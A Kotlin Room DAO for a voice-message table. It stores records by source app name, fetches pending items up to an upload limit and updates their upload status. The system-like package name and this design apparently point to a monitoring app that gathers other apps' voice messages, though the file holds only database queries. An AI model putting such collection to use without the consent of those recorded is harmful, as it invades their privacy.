package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.VoiceMessage
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface VoiceMessageDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(voiceMessage: List<VoiceMessage?>?)

    @Query("Select * from voice_message_table where status =:status ORDER BY date DESC limit ${AppConstants.mediaFilesUploadLimit}")
    fun selectAllVoiceMessageMessages(status: Int): List<VoiceMessage>

    @Query("Update voice_message_table set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date?, endDate: Date?): Int

    @Query("select max(timeStamp) from voice_message_table where appName=:appName")
    fun selectMaxTimeStamp(appName: String?): Long?

    @Query("Update voice_message_table set status=:updated_status where file=:file")
    fun update(file: String?, updated_status: Int): Int
}